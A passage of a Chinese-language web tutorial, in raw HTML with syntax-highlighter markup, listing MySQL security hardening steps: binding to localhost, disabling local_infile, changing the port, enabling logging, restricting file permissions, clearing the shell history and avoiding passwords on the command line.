[Debian/Ubuntu]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957ce429771195-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39a3957ce429771195-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957ce429771195-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39a3957ce429771195-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957ce429771195-1\"><span class=\"crayon-p\"># vi /etc/my.cnf\t                   [RHEL/CentOS]\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39a3957ce429771195-2\"><span class=\"crayon-p\"># vi /etc/mysql/my.conf                    [Debian/Ubuntu] </span></div><div class=\"crayon-line\" id=\"crayon-5a6f39a3957ce429771195-3\"><span class=\"crayon-st\">OR</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39a3957ce429771195-4\"><span class=\"crayon-p\"># vi /etc/mysql/mysql.conf.d/mysqld.cnf    [Debian/Ubuntu]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在 <code>[mysqld]</code> 部分中添加下面这一行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957d3278503644\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbind-address = 127.0.0.1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957d3278503644-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957d3278503644-1\"><span class=\"crayon-v\">bind</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">address</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">127.0.0.1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>3. 禁用 MySQL 的 LOCAL INFILE</h1>\n<p>作为安全性增强的一部分，您需要禁用 <strong>local_infile</strong>，使用下面的指令以防止在 <code>[mysqld]</code> 部分从 MySQL 中访问底层文件系统。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957d6944527117\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlocal-infile=0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957d6944527117-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957d6944527117-1\"><span class=\"crayon-v\">local</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">infile</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>4. 修改 MySQL 的默认端口</h1>\n<p>设置端口变量用于监听 TCP/IP 连接的 MySQL 端口号。默认端口号是 3306，但是您可以在 <strong>[mysqld] </strong>中修改它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957da966020202\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nPort=5000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957da966020202-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957da966020202-1\"><span class=\"crayon-v\">Port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">5000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>5、启用 MySQL 日志</h1>\n<p>日志是了解服务运行过程中发生了什么的最好的方法之一，在受到任何攻击的时候都可以很容易的从日志里看到任何入侵相关的行为。可以通过将下边的变量添加到配置文件[mysqld]部分来开启mysql日志功能。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957dd504016818\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlog=/var/log/mysql.log</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957dd504016818-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957dd504016818-1\"><span class=\"crayon-v\">log</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h1>6、设置合适的 MySQL 文件的访问权限</h1>\n<p>确保你已经为所有的 mysql 服务文件和数据路径设置了合适的访问权限。文件 /etc/my.conf 只能由 root 用户修改，这样就可以阻止其他用户修改数据库服务的配置。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957e1920074470\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# chmod 644 /etc/my.cnf</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957e1920074470-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957e1920074470-1\"><span class=\"crayon-p\"># chmod 644 /etc/my.cnf</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h1>7、删除 MySQL shell 历史</h1>\n<p>你在 MySQL shell 中执行的所有的命令都会被 mysql 客户端保存到一个历史文件：~/.mysql_history。这样是很危险的，因为对于你创建过的任何用户账户，所有的在 shell 输入过的用户名和密码都会记录到历史文件里面。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957e4670943265\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# cat /dev/null &gt; ~/.mysql_history</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957e4670943265-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957e4670943265-1\"><span class=\"crayon-p\"># cat /dev/null &gt; ~/.mysql_history</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h1>8. 不要在命令行中运行 MySQL 命令</h1>\n<p>正如你所知道的，你在终端上输入的所有命令都会被存储在一个历史文件中，具体取决于你正在使用的shell（例如 bash 的 shell 历史文件放在 <strong>~/.bash_history</strong>）。攻击者访问这个历史文件可以很容易地看到记录在那里的任何密码。</p>\n<p>非常不建议在命令行里面输入密码，如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957e7930009803\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mysql -u root -ppassword_</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957e7930009803-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957e7930009803-1\"><span class=\"crayon-p\"># mysql -u root -ppassword_</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<p style=\"text-align: center\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f505f9f9145e6e2ddd243ec3d3ebf9f5.png\"><br>\n<em>使用密码连接 MySQL</em></p>\n<p>当你查看命令行历史文件的最后的部分时，可以看到之前输入过的密码。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957eb407167991\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# history</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957eb407167991-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957eb407167991-1\"><span class=\"crayon-p\"># history</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<p style=\"text-align: center\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/ec120994b3b6eb87f569f32434861ce9.png\"><br>\n<em>查看命令行输入历史</em></p>\n<p>推荐连接 MySQL 的方式是</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957ee305208604\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mysql -u root -p\r\nEnter password:</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957ee305208604-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39a3957ee305208604-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957ee305208604-1\"><span class=\"crayon-p\"># mysql -u root -p</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39a3957ee305208604-2\"><span class=\"crayon-i\">Enter</span> <span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>9. 定义特定应用的数据库用户</h1>\n<p>对于每一个在服务器上运行的应用，只设置一个与该应用相关的数据库用户。例如你有一个 wordpress 